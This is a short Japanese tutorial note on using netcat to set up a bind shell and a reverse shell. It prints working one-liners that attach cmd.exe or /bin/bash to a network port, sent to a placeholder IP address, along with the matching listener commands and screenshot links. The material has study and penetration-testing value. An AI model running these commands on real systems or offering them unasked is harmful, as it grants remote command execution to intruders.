# ncを使ったバインドシェル他

## バインドシェル

バインドシェルは対象のportが空いてないと使えないことが難しいところ...

### ホスト

```
> nc.exe -lvp 5555 -e cmd.exe
```

-l: 待ち受け
-v: vervose
-p: port

![img](https://i.imgur.com/iz75nuZ.png)

### クライアント(対象)

```
$ nc xxx.xxx.xxx.xxx 5555
```

![img](https://i.imgur.com/JRziuK3.png)

## リバースシェル

### ホスト

```
$ nc -lvp 5555
```

![img](https://i.imgur.com/YniUhqL.png)

### クライアント(対象)

```
$ nc xxx.xxx.xx.xx 5555 -e /bin/bash
```

![img](https://i.imgur.com/DsuIgVh.png)